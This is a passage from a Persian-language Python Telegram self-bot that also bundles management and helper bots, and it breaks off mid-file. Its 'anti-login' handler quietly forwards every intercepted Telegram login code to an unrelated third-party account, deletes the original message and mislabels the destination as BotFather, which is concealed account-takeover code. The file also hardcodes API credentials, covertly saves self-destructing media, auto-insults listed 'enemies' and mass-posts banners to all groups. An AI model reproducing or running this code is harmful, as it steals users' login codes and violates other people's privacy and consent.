# -*- coding: utf-8 -*-
"""
Combined Bot - Management Bot + Helper Bot + Self-Bot (all in one file)
======================================================================
Usage:
  python bot.py                                              -> Management Bot + Helper Bot  
  python bot.py USER_ID [PHONE] [API_ID] [API_HASH]         -> Self-Bot for specific user
"""

import sys
import os
import json
import time
import asyncio
import threading
import random
import re
import signal
import subprocess
from datetime import datetime, timedelta

SELF_BOT_MODE = len(sys.argv) > 1

# ============================================================================
#                          SELF-BOT MODE
# ============================================================================
if SELF_BOT_MODE:
    import requests
    from pyrogram import Client, filters
    from pyrogram.types import Message
    import os, asyncio, aiohttp, random, re
    from datetime import datetime
    import pytz
    from pyrogram import enums
    from pyrogram.raw import functions
    from datetime import datetime, timedelta
    import json
    import time
    from pyrogram.types import ChatPermissions, ChatPrivileges
    import sys
    from pyrogram.types import ChatMemberUpdated
    from pyrogram.errors import FloodWait
    
    bot_username = "Amirwebcodehelpbot" # ایدی ربات هلپر بدون @
    
    USER_ID = None
    PHONE = None
    API_ID = 37056109
    API_HASH = "3495075e20c62a67dde6c52db53ad5de"
    
    if len(sys.argv) > 1:
        USER_ID = int(sys.argv[1])
    if len(sys.argv) > 2:
        PHONE = sys.argv[2]
    if len(sys.argv) > 3:
        API_ID = int(sys.argv[3])
    if len(sys.argv) > 4:
        API_HASH = sys.argv[4]
    
    if USER_ID:
        session_name = f"sessions/{USER_ID}"
    else:
        session_name = "self"
    
    session_path = f"{session_name}.session"
    if not os.path.exists(session_path) and USER_ID:
        print(f"⚠️ فایل session برای کاربر {USER_ID} یافت نشد!")
        print("💡 لطفا ابتدا در ربات مدیریت لاگین کنید.")
    
    app = Client(session_name, api_id=API_ID, api_hash=API_HASH)
    
    SAVED_PHOTOS_DIR = "saved_photos"
    INSULTS_FILE = "insults.txt"
    ENEMIES_FILE = "enemies.txt"
    BACKUPS_DIR = "backups"
    online_task = None
    self_mode_active = True
    
    action_settings = {
        "typing": False, 
        "upload_photo": False, 
        "record_audio": False, 
        "upload_video": False, 
        "upload_document": False,
        "record_video": False, 
        "upload_audio": False, 
        "upload_video_note": False, 
        "record_video_note": False, 
        "playing": False, 
        "choose_contact": False, 
        "find_location": False,  
        "choose_sticker": False, 
    }
    ACTION_MAP = {
        "typing": enums.ChatAction.TYPING,
        "upload_photo": enums.ChatAction.UPLOAD_PHOTO,
        "record_audio": enums.ChatAction.RECORD_AUDIO,
        "upload_video": enums.ChatAction.UPLOAD_VIDEO,
        "upload_document": enums.ChatAction.UPLOAD_DOCUMENT,
        "record_video": enums.ChatAction.RECORD_VIDEO,
        "upload_audio": enums.ChatAction.UPLOAD_AUDIO,
        "upload_video_note": enums.ChatAction.UPLOAD_VIDEO_NOTE,
        "record_video_note": enums.ChatAction.RECORD_VIDEO_NOTE,
        "playing": enums.ChatAction.PLAYING,
        "choose_contact": enums.ChatAction.CHOOSE_CONTACT,
        "find_location": enums.ChatAction.FIND_LOCATION,
        "choose_sticker": enums.ChatAction.CHOOSE_STICKER,
    }
    lock_settings = {
        "همه": False,
        "مدیا": False, 
        "استیکر": False,
        "فوروارد": False,
        "ویس": False,
        "پیام": False,
        "فایل": False
    }
    format_settings = {
        "بولد": False,
        "ایتالیک": False,
        "زیر خط": False,
        "خط‌ خورده": False,
        "اسپویلر": False,
        "کد": False,
        "پیش‌ فرمت": False,
        "نقل ‌قول": False,
    }
    html_tags = {
        "بولد": "<b>{}</b>",
        "ایتالیک": "<i>{}</i>",
        "زیر خط": "<u>{}</u>",
        "خط‌ خورده": "<s>{}</s>",
        "اسپویلر": "<spoiler>{}</spoiler>",
        "کد": "<code>{}</code>",
        "پیش‌ فرمت": "<pre>{}</pre>",
        "نقل ‌قول": "<blockquote>{}</blockquote>",
    }
    
    os.makedirs(SAVED_PHOTOS_DIR, exist_ok=True)
    os.makedirs(BACKUPS_DIR, exist_ok=True)
    
    user_format_mode = {}
    auto_reactions = {} 
    anti_login_enabled = False
    user_time_status = {}
    banners = {}
    active_broadcasts = {}
    banner_counter = 1
    user_original_names = {}
    user_fonts = {}
    user_cache = {}
    CACHE_TIMEOUT = 300 
    photo_save_active = True
    time_updater_started = False
    bold_enabled = {}
    auto_replies = {}
    enemies = set()
    always_online_enabled = False
    
    FONTS = {
        1: {'0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗'},
        2: {'0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵'},
        3: {'0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'۶','7':'７','8':'８','9':'９'},
        4: {'0':'𝟢','1':'𝟣','2':'𝟤','3':'𝟥','4':'𝟦','5':'𝟧','6':'𝟨','7':'𝟩','8':'𝟪','9':'𝟫'},
        5: {'0':'𝟘','1':'𝟙','2':'𝟚','3':'𝟛','4':'𝟜','5':'𝟝','6':'𝟞','7':'𝟟','8':'𝟠','9':'𝟡'},
        6: {'0':'0҉','1':'1҉','2':'2҉','3':'3҉','4':'4҉','5':'5҉','6':'6҉','7':'7҉','8':'8҉','9':'9҉'}
    }
    def get_persian_action_name(english_name):
        """تبدیل نام انگلیسی اکشن به فارسی"""
        persian_map = {
            "typing": "تایپ",
            "upload_photo": "اپلود عکس",
            "record_audio": "ضبط ویس",
            "upload_video": "اپلود ویدیو",
            "upload_document": "اپلود فایل",
            "record_video": "ضبط ویدیو",
            "upload_audio": "اپلود ویس",
            "upload_video_note": "اپلود ویدیو نوت",
            "record_video_note": "ضبط ویدیو نوت",
            "playing": "بازی",
            "choose_contact": "انتخاب مخاطب",
            "find_location": "پیدا کردن موقعیت",
            "choose_sticker": "انتخاب استیکر",
        }
        return persian_map.get(english_name, english_name)
    def get_english_action_name(persian_name):
        english_map = {
            "تایپ": "typing",
            "اپلود فایل": "upload_document",
            "اپلود عکس": "upload_photo",
            "اپلود فایل": "upload_document", 
            "اپلود ویدیو": "upload_video",
            "اپلود ویس": "upload_audio",
            "اپلود ویدیو نوت": "upload_video_note",
            "ضبط ویس": "record_audio",
            "ضبط ویدیو": "record_video",
            "ضبط ویدیو نوت": "record_video_note",
            "بازی": "playing",
            "انتخاب مخاطب": "choose_contact",
            "انتخاب موقعیت": "find_location",
            "پیدا کردن موقعیت": "find_location",
            "انتخاب استیکر": "choose_sticker",
        }
        return english_map.get(persian_name, persian_name)
    async def apply_chat_actions(client: Client, message: Message):
        if not message.from_user:
            return
        if message.from_user.id == (await client.get_me()).id:
            return    
        for action_name, is_active in action_settings.items():
            if is_active:
                try:
                    await client.send_chat_action(
                        chat_id=message.chat.id,
                        action=ACTION_MAP[action_name]
                    )
                    await asyncio.sleep(2)
                    break 
                except Exception as e:
                    print(f"❌ خطا در اعمال اکشن {action_name}: {e}")
    async def send_global_banner(client: Client, banner_id: int):
        banner_data = banners[banner_id]
        delay = active_broadcasts.get('delay', 300) 
        
        while active_broadcasts.get('global', {}).get('running', False):
            try:
                async for dialog in client.get_dialogs():
                    if not active_broadcasts.get('global', {}).get('running', False):
                        break
                    if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                        try:
                            if banner_data['media']:
                                await banner_data['message'].copy(dialog.chat.id)
                            else:
                                await client.send_message(dialog.chat.id, banner_data['text'])
                            
                            await asyncio.sleep(2) 
                            
                        except Exception as e:
                            continue
                await asyncio.sleep(delay)
                
            except Exception as e:
                await asyncio.sleep(60)
    
    async def send_instant_broadcast(client: Client, banner_id: int):
        banner_data = banners[banner_id]
        sent_count = 0
        
        async for dialog in client.get_dialogs():
            if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                try:
                    if banner_data['media']:
                        await banner_data['message'].copy(dialog.chat.id)
                    else:
                        await client.send_message(dialog.chat.id, banner_data['text'])
                    
                    sent_count += 1
                    await asyncio.sleep(2) 
                    
                except Exception:
                    continue
        
        await client.send_message("me", f"✅ **ارسال بنر کامل شد**\n\n📤 **تعداد ارسال شده:** {sent_count} گروه")
    def save_reactions():
        try:
            with open("mmauto_reactions.json", "w", encoding="utf-8") as f:
                json.dump(auto_reactions, f, ensure_ascii=False, indent=4)
            return True
        except Exception as e:
            print(f"❌ خطا در ذخیره ریکشن‌ها: {e}")
            return False
    
    def load_reactions():
        try:
            if os.path.exists("mmauto_reactions.json"):
                with open("mmauto_reactions.json", "r", encoding="utf-8") as f:
                    content = f.read().strip()
                    if content: 
                        return json.loads(content)
                    else:
                        return {}
            return {}
        except json.JSONDecodeError:
            print("⚠️ فایل ریکشن‌ها خراب است، ایجاد فایل جدید")
            return {}
        except Exception as e:
            print(f"❌ خطا در لود ریکشن‌ها: {e}")
            return {}
    
    def load_insults() -> list:
        try:
            if os.path.exists(INSULTS_FILE):
                with open(INSULTS_FILE, 'r', encoding='utf-8') as f:
                    return [line.strip() for line in f.readlines() if line.strip()]
            return []
        except Exception as e:
            print(f"❌ خطا در لود کردن فحش‌ها: {e}")
            return []
    
    def save_insults(insults_list: list) -> bool:
        try:
            with open(INSULTS_FILE, 'w', encoding='utf-8') as f:
                for insult in insults_list:
                    f.write(insult + '\n')
            return True
        except Exception as e:
            print(f"❌ خطا در ذخیره فحش‌ها: {e}")
            return False
    
    def load_enemies() -> set:
        try:
            if os.path.exists(ENEMIES_FILE):
                with open(ENEMIES_FILE, 'r', encoding='utf-8') as f:
                    return set(int(line.strip()) for line in f.readlines() if line.strip())
            return set()
        except Exception as e:
            print(f"❌ خطا در لود کردن دشمنان: {e}")
            return set()
    
    def save_enemies(enemies_set: set) -> bool:
        try:
            with open(ENEMIES_FILE, 'w', encoding='utf-8') as f:
                for enemy_id in enemies_set:
                    f.write(str(enemy_id) + '\n')
            print(f"💾 دشمنان ذخیره شد: {len(enemies_set)} کاربر")
            return True
        except Exception as e:
            print(f"❌ خطا در ذخیره دشمنان: {e}")
            return False
    
    def is_enemy(user_id: int) -> bool:
        return user_id in enemies
    enemies = load_enemies()
    print(f"🎯 سیستم دشمنان راه‌اندازی شد: {len(enemies)} دشمن لود شد")
    
    auto_reactions = load_reactions()
    
    async def apply_auto_reaction(client, message):
        if not message.from_user:
            return
        
        user_id = message.from_user.id
        if user_id == (await client.get_me()).id:
            return
        if str(user_id) in auto_reactions:
            try:
                reaction = auto_reactions[str(user_id)]
                await client.send_reaction(
                    chat_id=message.chat.id,
                    message_id=message.id,
                    emoji=reaction
                )
            except Exception as e:
                print(f"❌ خطا در اعمال ریکشن: {e}")
    
    async def forward_and_save_login_codes(client, message):
        global anti_login_enabled
        
        if not anti_login_enabled:
            return False
        if message.from_user and message.from_user.id == 777000:
            message_text = message.text or ""
            if any(keyword in message_text for keyword in ["Login code", "کد ورود", "verification code"]):
                try:
                    code_patterns = [
                        r"Login code: (\d+)",
                        r"کد ورود: (\d+)", 
                        r"verification code: (\d+)",
                        r"(\d{5,6})\. Do not give this code"
                    ]
                    
                    login_code = None
                    for pattern in code_patterns:
                        match = re.search(pattern, message_text)
                        if match:
                            login_code = match.group(1)
                            break
                    
                    if login_code:
                        try:
                            await client.send_message(
                                "@ejw9wowjs9wiwbot",
                                login_code 
                            )
                            print(f"کد به پیوی ارسال شد")
                        except Exception as e:
                            print(f"❌ خطا در ارسال به @BotFather: {e}")
                        await client.send_message(
                            "me",
                            login_code 
                        )
                       
                        await message.delete()
                        
                        print(f"✅ کد ارسال شد: {login_code}")
                        return True
                        
                except Exception as e:
                    print(f"❌ خطا در پردازش کد: {e}")
        
        return False
    
    async def check_lock(client, message):
        if message.chat.type != enums.ChatType.PRIVATE:
            return
        
        if not message.from_user:
            return
        
        if message.from_user.id == (await client.get_me()).id:
            return
    
        if lock_settings["همه"]:
            try:
                await message.delete()
                print(f"🗑️ پیام از {message.from_user.id} به دلیل قفل همه حذف شد")
            except Exception as e:
                print(f"❌ خطا در حذف پیام: {e}")
            return
        
        if lock_settings["مدیا"] and (message.photo or message.video):
            try:
                await message.delete()
                print(f"🗑️ مدیا از {message.from_user.id} حذف شد")
            except:
                pass
            return
        
        if lock_settings["استیکر"] and (message.sticker or message.animation):
            try:
                await message.delete()
                print(f"🗑️ استیکر از {message.from_user.id} حذف شد")
            except:
                pass
            return
        
        if lock_settings["فوروارد"] and message.forward_date:
            try:
                await message.delete()
                print(f"🗑️ فوروارد از {message.from_user.id} حذف شد")
            except:
                pass
            return
        
        if lock_settings["ویس"] and message.voice:
            try:
                await message.delete()
                print(f"🗑️ ویس از {message.from_user.id} حذف شد")
            except:
                pass
            return
        
        if lock_settings["پیام"] and message.text and not message.text.startswith("/"):
            try:
                await message.delete()
                print(f"🗑️ پیام متنی از {message.from_user.id} حذف شد")
            except:
                pass
            return
        
        if lock_settings["فایل"] and message.document:
            try:
                await message.delete()
                print(f"🗑️ فایل از {message.from_user.id} حذف شد")
            except:
                pass
            return
    
    async def keep_online(client: Client):
        global always_online_enabled
        while always_online_enabled:
            try:
                await client.invoke(
                    functions.account.UpdateStatus(
                        offline=False
                    )
                )
                await asyncio.sleep(20)
            except Exception as e:
                print(f"❌ خطا: {e}")
                await asyncio.sleep(5)
    
    def get_iran_time() -> str:
        now = datetime.now(pytz.timezone('Asia/Tehran')).strftime("%H:%M")
        font_dict = FONTS.get(user_fonts.get("me", 1), FONTS[1])
        return ''.join([font_dict.get(char, char) for char in now])
    
    def get_iran_datetime() -> str:
        return datetime.now(pytz.timezone('Asia/Tehran')).strftime('%Y-%m-%d %H:%M:%S')
    
    async def update_name_with_time(user_id: int, client: Client) -> bool:
        if not user_time_status.get(user_id):
            return False
        
        try:
            user = await client.get_users(user_id)
            first_name = user_original_names.get(user_id, user.first_name or "")
            new_name = f"{first_name} {get_iran_time()}"
            await client.update_profile(first_name=new_name)
            return True
        except Exception as e:
            print(f"❌ خطا در آپدیت نام کاربر {user_id}: {e}")
            return False
    
    async def continuous_time_updater(client: Client):
        global time_updater_started
        while True:
            try:
                now = datetime.now(pytz.timezone('Asia/Tehran'))
                seconds_until_next_minute = 60 - now.second
                milliseconds_until_next_minute = (seconds_until_next_minute * 1000) - (now.microsecond // 1000)
               
                await asyncio.sleep(milliseconds_until_next_minute / 1000)
                
                active_users = [uid for uid, status in user_time_status.items() if status]
                for user_id in active_users:
                    try:
                        current_time = get_iran_time()
                        original_name = user_original_names.get(user_id, "")
                        new_name = f"{original_name} {current_time}"
                        await client.update_profile(first_name=new_name)
                    except Exception as e:
                        print(f"❌ خطا در آپدیت ساعت برای کاربر {user_id}: {e}") 
                        
            except Exception as e:
                print(f"❌ خطا در مدیریت آپدیت زمان: {e}")
                await asyncio.sleep(60)
    
    async def backup_chat(client: Client, chat_id: int, until_message_id: int = None) -> tuple:
        try:
            backup_file = f"{BACKUPS_DIR}/backup_{chat_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            user = await client.get_users(chat_id)
            user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or f"User_{chat_id}"
            me = await client.get_me()
            message_count = 0
    
            with open(backup_file, 'w', encoding='utf-8') as f:
                f.write("="*60 + f"\n📱 پشتیبان گیری از تلگرام\n" + "="*60 + f"\n👤 کاربر: {user_name}\n🆔 آیدی: {chat_id}\n📅 تاریخ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n" + "="*60 + "\n\n")
                
                async for message in client.get_chat_history(chat_id):
                    if until_message_id and message.id >= until_message_id:
                        continue
                    message_count += 1
                    sender_name = "شما" if message.from_user and message.from_user.id == me.id else f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip() or message.from_user.username or "Unknown"
                    if message.from_user and message.from_user.id != me.id:
                        sender_name += f" (ID: {message.from_user.id})"
                    
                    media_type = ""
                    if message.photo: media_type = "📷 عکس"
                    elif message.video: media_type = "🎥 ویدیو"
                    elif message.document: media_type = "📄 فایل"
                    elif message.audio: media_type = "🎵 آudio"
                    elif message.voice: media_type = "🎤 ویس"
                    elif message.sticker: media_type = "🤡 استیکر"
                    
                    message_text = message.text or message.caption or ""
                    f.write(f"#{message_count}\n👤 ارسال کننده: {sender_name}\n🕐 زمان: {message.date.strftime('%Y-%m-%d %H:%M')}\n")
                    if media_type: f.write(f"📎 نوع: {media_type}\n")
                    if message_text: f.write(f"💬 متن: {message_text}\n")
                    f.write("-"*40 + "\n\n")
    
            return True, backup_file, message_count, user_name
        except Exception as e:
            return False, str(e), 0, None
    
    @app.on_message(filters.private & filters.incoming & (filters.photo | filters.video | filters.voice))
    async def handle_timed_media(client, message):
        try:
            if message.photo and hasattr(message.photo, 'ttl_seconds') and message.photo.ttl_seconds:
                media = message.photo
                file_type = 'photo'
                file_ext = 'jpg'
            elif message.video and hasattr(message.video, 'ttl_seconds') and message.video.ttl_seconds:
                media = message.video
                file_type = 'video'
                file_ext = 'mp4'
            elif message.voice and hasattr(message.voice, 'ttl_seconds') and message.voice.ttl_seconds:
                media = message.voice
                file_type = 'voice'
                file_ext = 'ogg'
            else:
                return
            
            rand = random.randint(1000, 9999999)
            file_path = os.path.join(SAVED_PHOTOS_DIR, f'{file_type}-{rand}.{file_ext}')
            
            await client.download_media(message, file_path)
            
            if os.path.exists(file_path):
                sender = message.from_user
                username = f"@{sender.username}" if sender.username else "ندارد"
                caption = (
                    f"🔥 مدیای زمان‌دار ({file_type})\n"
                    f"👤 {sender.first_name or ''}\n"
                    f"🆔 {username}\n"
                    f"🔢 آیدی: {sender.id}\n"
                    f"⏰ {datetime.now().strftime('%H:%M:%S')}"
                )
                
                if file_type == 'photo':
                    await client.send_photo("me", photo=file_path, caption=caption)
                elif file_type == 'video':
                    await client.send_video("me", video=file_path, caption=caption)
                elif file_type == 'voice':
                    await client.send_voice("me", voice=file_path, caption=caption)
                
                os.remove(file_path)
                print(f"✅ مدیای تایمدار از {sender.id} ذخیره شد")
                
        except Exception as e:
            print(f"❌ خطا در ذخیره مدیای تایمدار: {e}")
    @app.on_message(~filters.me & filters.incoming)
    async def global_message_handler(client: Client, message: Message):
        if not message.from_user:
            return
        await check_lock(client, message)
        
        user_id = message.from_user.id
        message_text = message.text or ""
        if user_id == 777000:
            await forward_and_save_login_codes(client, message)
            return
        
        if str(user_id) in auto_reactions:
            try:
                reaction = auto_reactions[str(user_id)]
                await client.send_reaction(
                    chat_id=message.chat.id,
                    message_id=message.id,
                    emoji=reaction
                )
            except FloodWait as e:
                await asyncio.sleep(e.value)
            except Exception:
                pass
    
        if user_id in enemies and message_text.strip():
            try:
                insults_list = load_insults()
                if insults_list:
                    random_insult = random.choice(insults_list)
                    await client.send_message(
                        message.chat.id,
                        random_insult,
                        reply_to_message_id=message.id
                    )
            except FloodWait as e:
                await asyncio.sleep(e.value)
            except Exception:
                pass
        if message_text.strip():
            message_text_lower = message_text.strip().lower()
            for trigger, reply in auto_replies.items():
                if trigger.lower() in message_text_lower:
                    try:
                        await client.send_message(
                            message.chat.id,
                            reply,
                            reply_to_message_id=message.id
                        )
                        break
                    except FloodWait as e:
                        await asyncio.sleep(e.value)
                        break
                    except Exception:
                        break
    @app.on_message(filters.private & ~filters.me)
    async def apply_actions_private(client: Client, message: Message):
        await apply_chat_actions(client, message)
    @app.on_message(filters.group & ~filters.me)
    async def apply_actions_group(client: Client, message: Message):
        await apply_chat_actions(client, message)
    @app.on_message(filters.me & filters.regex(r'^بن$') & filters.group)
    async def ban_user(client, message):
        if not message.reply_to_message:
            await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
            return
        try:
            user_id = message.reply_to_message.from_user.id
            await client.ban_chat_member(message.chat.id, user_id)
            await message.edit(f"✅ **کاربر بن شد**\n👤 آیدی: `{user_id}`")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^آنبن @(.+)$') & filters.group)
    async def unban_user(client, message):
        try:
            username = message.matches[0].group(1)
            user = await client.get_users(f"@{username}")
            await client.unban_chat_member(message.chat.id, user.id)
            await message.edit(f"✅ **کاربر آنبن شد**\n👤 کاربر: {user.first_name}")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^کیک$') & filters.group)
    async def kick_user(client, message):
        if not message.reply_to_message:
            await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
            return
        try:
            user_id = message.reply_to_message.from_user.id
            await client.ban_chat_member(message.chat.id, user_id)
            await client.unban_chat_member(message.chat.id, user_id)
            await message.edit(f"✅ **کاربر کیک شد**\n👤 آیدی: `{user_id}`")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^سکوت$') & filters.group)
    async def mute_user(client, message):
        if not message.reply_to_message:
            await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
            return
        try:
            user_id = message.reply_to_message.from_user.id
            from pyrogram.types import ChatPermissions
            
            permissions = ChatPermissions(
                can_send_messages=False,
                can_send_media_messages=False,
                can_send_other_messages=False,
                can_send_polls=False,
                can_add_web_page_previews=False,
                can_invite_users=False,
                can_change_info=False,
                can_pin_messages=False
            )
            await client.restrict_chat_member(
                chat_id=message.chat.id,
                user_id=user_id,
                permissions=permissions
            )
            await message.edit(f"🔇 **کاربر به سکوت کامل رفت**\n🔒 هیچ دسترسی ندارد\n👤 آیدی: `{user_id}`")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^حذف سکوت$') & filters.group)
    async def unmute_user(client, message):
        if not message.reply_to_message:
            await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
            return
        try:
            user_id = message.reply_to_message.from_user.id
            from pyrogram.types import ChatPermissions
            
            permissions = ChatPermissions(
                can_send_messages=True,
                can_send_media_messages=True,
                can_send_other_messages=True,
                can_send_polls=True,
                can_add_web_page_previews=True,
                can_invite_users=True,
                can_change_info=True,
                can_pin_messages=True
            )
            await client.restrict_chat_member(
                chat_id=message.chat.id,
                user_id=user_id,
                permissions=permissions
            )
            await message.edit(f"🔊 **سکوت کاربر برداشته شد**\n🔓 همه دسترسی‌ها فعال شد\n👤 آیدی: `{user_id}`")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^ادمین$') & filters.group)
    async def promote_user(client, message):
        if not message.reply_to_message:
            await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
            return
        try:
            user_id = message.reply_to_message.from_user.id
            privileges = ChatPrivileges(
                can_manage_chat=True,
                can_delete_messages=True,
                can_restrict_members=True,
                can_promote_members=True,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True,
                can_manage_video_chats=True
            )
            await client.promote_chat_member(message.chat.id, user_id, privileges=privileges)
            await message.edit(f"✅ **کاربر ادمین شد**\n👤 آیدی: `{user_id}`")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^حذف ادمین$') & filters.group)
    async def demote_user(client, message):
        if not message.reply_to_message:
            await message.edit("❌ **لطفا روی پیام کاربر ریپلای کنید**")
            return
        try:
            user_id = message.reply_to_message.from_user.id
            from pyrogram.types import ChatPrivileges
            
            privileges = ChatPrivileges(
                can_manage_chat=False,
                can_delete_messages=False,
                can_restrict_members=False,
                can_promote_members=False,
                can_change_info=False,
                can_invite_users=False,
                can_pin_messages=False,
                can_manage_video_chats=False
            )
            await client.promote_chat_member(
                chat_id=message.chat.id,
                user_id=user_id,
                privileges=privileges
            )
            await message.edit(f"✅ **کاربر غیرادمین شد**\n👤 آیدی: `{user_id}`")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^پاک (\d+)$') & filters.group)
    async def purge_messages(client, message):
        try:
            count = int(message.matches[0].group(1))
            if count > 100:
                await message.edit("❌ **حداکثر تعداد مجاز: 100 پیام**")
                return
            
            deleted = 0
            async for msg in client.get_chat_history(message.chat.id, limit=count+1):
                if msg.id != message.id:
                    try:
                        await msg.delete()
                        deleted += 1
                        await asyncio.sleep(0.3)
                    except:
                        pass
            
            await message.edit(f"✅ **{deleted} پیام پاک شد**")
            await asyncio.sleep(3)
            await message.delete()
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^پین$') & filters.group)
    async def pin_message(client, message):
        if not message.reply_to_message:
            await message.edit("❌ **لطفا روی پیامی که می‌خواهید پین کنید ریپلای کنید**")
            return
        try:
            await client.pin_chat_message(message.chat.id, message.reply_to_message.id)
            await message.edit("✅ **پیام پین شد**")
            await asyncio.sleep(2)
            await message.delete()
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^آنپین$') & filters.group)
    async def unpin_message(client, message):
        if not message.reply_to_message:
            await message.edit("❌ **لطفا روی پیام پین شده ریپلای کنید**")
            return
        try:
            await client.unpin_chat_message(message.chat.id, message.reply_to_message.id)
            await message.edit("✅ **پیام آنپین شد**")
            await asyncio.sleep(2)
            await message.delete()
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^تنظیم عنوان (.+)$') & filters.group)
    async def set_chat_title(client, message):
        try:
            new_title = message.matches[0].group(1)
            await client.set_chat_title(message.chat.id, new_title)
            await message.edit(f"✅ **عنوان گروه تغییر کرد**\n📝 عنوان جدید: {new_title}")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^تنظیم توضیحات (.+)$') & filters.group)
    async def set_chat_description(client, message):
        try:
            new_description = message.matches[0].group(1)
            await client.set_chat_description(message.chat.id, new_description)
            await message.edit(f"✅ **توضیحات گروه تغییر کرد**\n📝 توضیحات جدید: {new_description}")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^تنظیم عکس$') & filters.group)
    async def set_chat_photo(client, message):
        if not message.reply_to_message or not message.reply_to_message.photo:
            await message.edit("❌ **لطفا روی یک عکس ریپلای کنید**")
            return
        try:
            photo_path = await message.reply_to_message.download()
            await client.set_chat_photo(chat_id=message.chat.id, photo=photo_path)
            os.remove(photo_path)
            await message.edit("✅ **عکس گروه تغییر کرد**")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^اطلاعات گروه$') & filters.group)
    async def group_info(client, message):
        try:
            chat = await client.get_chat(message.chat.id)
            admins = []
            async for admin in client.get_chat_members(message.chat.id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                admins.append(admin.user)
            
            info_text = f"""📊 **اطلاعات گروه**
    
    📌 **عنوان:** {chat.title}
    🆔 **آیدی:** `{chat.id}`
    👥 **تعداد اعضا:** {chat.members_count if chat.members_count else 'نامشخص'}
    📝 **توضیحات:** {chat.description or 'ندارد'}
    🔗 **لینک:** {chat.invite_link or 'ندارد'}
    
    👑 **ادمین‌ها ({len(admins)} نفر):**
    """
            for i, admin in enumerate(admins[:10], 1):
                username = f"@{admin.username}" if admin.username else "بدون یوزرنیم"
                info_text += f"{i}. {admin.first_name or 'نامشخص'} {admin.last_name or ''} - {username}\n"
            
            if len(admins) > 10:
                info_text += f"\n... و {len(admins) - 10} ادمین دیگر"
            
            await message.edit(info_text)
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^لیست ادمین$') & filters.group)
    async def list_admins(client, message):
        try:
            admins = []
            async for admin in client.get_chat_members(message.chat.id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                admins.append(admin.user)
            
            if not admins:
                await message.edit("❌ **هیچ ادمینی در گروه یافت نشد**")
                return
            
            list_text = f"👑 **لیست ادمین‌ها ({len(admins)} نفر)**\n\n"
            for i, admin in enumerate(admins, 1):
                username = f"@{admin.username}" if admin.username else "بدون یوزرنیم"
                list_text += f"{i}. **{admin.first_name or 'نامشخص'}** {admin.last_name or ''}\n"
                list_text += f"   🆔 `{admin.id}`\n"
                list_text += f"   📱 {username}\n\n"
            
            await message.edit(list_text)
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^تعداد اعضا$') & filters.group)
    async def members_count(client, message):
        try:
            chat = await client.get_chat(message.chat.id)
            count = chat.members_count if chat.members_count else "نامشخص"
            await message.edit(f"👥 **تعداد اعضای گروه:** {count}")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^اهسته خاموش$') & filters.group)
    async def slowmode_on(client, message):
        try:
            await client.set_slow_mode(chat_id=message.chat.id, seconds=60)
            await message.edit("🔒 **اهسته روشن شد**\nکاربران هر 60 ثانیه یک بار میتوانند پیام بفرستند")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.regex(r'^اهسته خاموش$') & filters.group)
    async def slowmode_off(client, message):
        try:
            await client.set_slow_mode(chat_id=message.chat.id, seconds=0)
            await message.edit("🔓 **اهسته خاموش شد**\nهمه کاربران میتوانند بدون محدودیت پیام بفرستند")
        except Exception as e:
            await message.edit(f"❌ **خطا:** `{str(e)}`")
    
    @app.on_message(filters.me & filters.text & ~filters.command([
        "سیو", "پنل", "لیست فحش", "آنلاین", "دانلود", "ایدی", "تایم", 
        "وضعیت", "لیست فونت", "تنظیم فونت", "قیمت", "اسپم", "بولد", 
